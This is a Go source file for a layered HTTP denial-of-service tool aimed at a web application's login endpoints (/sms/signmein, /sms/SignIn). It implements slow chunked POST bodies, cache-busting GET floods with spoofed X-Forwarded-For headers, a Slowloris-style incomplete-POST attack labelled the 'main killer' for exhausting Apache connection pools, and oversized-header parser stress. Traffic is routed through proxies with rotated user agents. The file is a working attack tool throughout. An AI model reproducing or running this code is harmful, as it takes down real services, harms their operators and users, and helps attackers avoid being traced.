package main

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

// ============================================================
// LAYER 1: LIGHT FAKE LOGIN — Slow chunked body (optimized)
// ============================================================
func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClient()
	client.Timeout = 0

	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/signmein"
	refererURL := baseURL + "/sms/SignIn"
	layerIdx := 0

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		body := lightSlowBody()

		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, body)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
		req.Header.Set("Referer", refererURL)

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(200)+100) * time.Millisecond)
	}
}

func lightSlowBody() io.Reader {
	r, w := io.Pipe()
	go func() {
		defer w.Close()
		w.Write([]byte("username=" + strings.Repeat("A", 256)))
		time.Sleep(time.Duration(rand.Intn(800)+400) * time.Millisecond)
		w.Write([]byte("&password=" + strings.Repeat("B", 256)))
		time.Sleep(time.Duration(rand.Intn(800)+400) * time.Millisecond)
		w.Write([]byte(fmt.Sprintf("&capt=%d", rand.Intn(20)+1)))
		for i := 0; i < 5; i++ {
			time.Sleep(time.Duration(rand.Intn(500)+300) * time.Millisecond)
			w.Write([]byte("&x" + fmt.Sprintf("%d", i) + "=" + strings.Repeat("Y", 64)))
		}
	}()
	return r
}

// ============================================================
// LAYER 2 + 3: MINIMAL — Just occasional SignIn hits
// ============================================================
func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/SignIn"
	layerIdx := 1

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		fullURL := fmt.Sprintf("%s?_=%d", targetURL, rand.Int63())

		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Accept", "text/html")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		// Longer delay — bandwidth bachane ke liye
		time.Sleep(time.Duration(rand.Intn(100)+50) * time.Millisecond)
	}
}

func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
	// Same as L2 — just additional pressure with different headers
	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/SignIn"
	layerIdx := 2

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		fullURL := fmt.Sprintf("%s?_=%d", targetURL, rand.Int63())

		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Accept", "text/html")
		req.Header.Set("X-Forwarded-For", randomIP())

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(100)+50) * time.Millisecond)
	}
}

// ============================================================
// LAYER 4: APACHE CONNECTION POOL EXHAUSTION — MAIN KILLER
// Sabse kam bandwidth, sabse zyada damage
// ============================================================
func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
	layerIdx := 3

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		conn, err := o.proxyMgr.dialer.Dial("tcp", o.target.Host)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		// Incomplete POST — Apache waits for Content-Length body
		incompleteReq := fmt.Sprintf(
			"POST /sms/signmein HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999\r\nConnection: keep-alive\r\n\r\n",
			o.target.Host,
		)

		conn.SetDeadline(time.Now().Add(30 * time.Second))
		_, err = conn.Write([]byte(incompleteReq))
		if err != nil {
			conn.Close()
			continue
		}

		// VERY slow drip — bytes per second, connection stays for 20-30 seconds
		for i := 0; i < 20; i++ {
			select {
			case <-ctx.Done():
				conn.Close()
				return ctx.Err()
			case <-time.After(time.Duration(rand.Intn(1500)+500) * time.Millisecond):
			}

			conn.SetDeadline(time.Now().Add(5 * time.Second))
			// Send just 10 bytes per iteration — extremely slow
			if _, err := conn.Write([]byte("x")); err != nil {
				break
			}
		}

		conn.Close()
	}
}

// ============================================================
// LAYER 5: PARSER STRESS — Light version
// ============================================================
func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(20 * time.Second)
	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/SignIn"
	layerIdx := 4

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		// Just one oversized header instead of many
		req.Header.Set("X-Oversized-Data", randomString(4096))
		// Fewer duplicate headers
		for i := 0; i < 20; i++ {
			req.Header.Add("X-Dup", "v")
		}

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(200)+100) * time.Millisecond)
	}
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

var userAgents = []string{
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/151.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) AppleWebKit/605.1.15 Version/17.4 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
